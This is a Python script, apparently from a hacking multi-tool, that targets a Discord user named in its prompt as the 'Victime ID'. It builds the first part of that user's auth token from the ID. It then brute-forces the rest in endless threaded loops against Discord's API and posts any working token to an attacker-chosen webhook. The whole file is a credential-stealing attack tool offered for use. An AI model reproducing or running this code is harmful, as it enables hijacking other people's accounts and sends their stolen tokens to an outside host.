


from Config.Util import *
from Config.Config import *
import string
import requests
import json
import random
import threading
import base64
Title("Discord Token To Id")

userid = input(f"{color.RED}\n{INPUT} Victime ID -> {color.RESET}")
encodedBytes = base64.b64encode(userid.encode("utf-8"))
OnePartToken = str(encodedBytes, "utf-8")
motifs = ["=", "==", "==="]
for motif in motifs:
    if OnePartToken.endswith(motif):
        OnePartToken = OnePartToken[:-2]

print(f'{color.RED}{INFO} Part One Token: {color.WHITE}{OnePartToken}.{color.RED}{color.RESET}')

brute = input(f"{color.RED}{INPUT} Find the second part by brute force ? (y/n) -> {color.RESET}")
if brute in ['y', 'Y', 'Yes', 'yes', 'YES']:
    pass
else:
    Continue()
    Reset()

webhook = input(f"{color.RED}{INPUT} Webhook ? (y/n) -> {color.RESET}")
if webhook in ['y', 'Y', 'Yes', 'yes', 'YES']:
    webhook_url = input(f"{color.RED}{INPUT} Webhook URL -> {color.RESET}")
    try:
        response = requests.head(webhook_url)
        if response.status_code != 200:
            ErrorWebhook()
        else:
            print(f"{color.RED}{INFO} Webhook Valid.")
    except:
        ErrorWebhook()

try:
    threads_number = int(input(f"{INPUT} Threads Number -> {color.RESET}"))
except:
    ErrorNumber()


def send_webhook(embed_content):
    payload = {
    'embeds': [embed_content],
    'username': username_webhook,
    'avatar_url': avatar_webhook
    }

    headers = {
    'Content-Type': 'application/json'
    }

    requests.post(webhook_url, data=json.dumps(payload), headers=headers)

def token_check():
    first = OnePartToken
    second = ''.join(random.choice(string.ascii_letters + string.digits + '-' + '_') for _ in range(random.choice([6])))
    third =  ''.join(random.choice(string.ascii_letters + string.digits + '-' + '_') for _ in range(random.choice([38])))
    token = f"{first}.{second}.{third}"

    try:
        try:
            user = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()
            user['username']
            if webhook in ['y']:
                embed_content = {
                'title': f'Token Valid !',
                'description': f"**__Token:__**\n```{token}```",
                'color': color_webhook,
                'footer': {
                "text": username_webhook,
                "icon_url": avatar_webhook,
                }
                }
                send_webhook(embed_content)
                print(f"{green}[{white}{current_time_hour()}{green}] {GEN_VALID} Status:  {color.WHITE}Valid{color.GREEN}  | Token: {color.WHITE}{token}{color.GREEN}")
            else:
                print(f"{green}[{white}{current_time_hour()}{green}] {GEN_VALID} Status:  {color.WHITE}Valid{color.GREEN}  | Token: {color.WHITE}{token}{color.GREEN}")
        except:
            print(f"{red}[{white}{current_time_hour()}{red}] {GEN_INVALID} Status: {color.WHITE}Invalid{color.RED} | Token: {color.WHITE}{token}{color.RED}")
    except:
        print(f"{red}[{white}{current_time_hour()}{red}] {GEN_INVALID} Status: {color.WHITE}Error{color.RED} | Token: {color.WHITE}{token}{color.RED}")

def request():
    threads = []
    try:
        for _ in range(int(threads_number)):
            t = threading.Thread(target=token_check)
            t.start()
            threads.append(t)
    except:
        ErrorNumber()

    for thread in threads:
        thread.join()

while True:
    request()
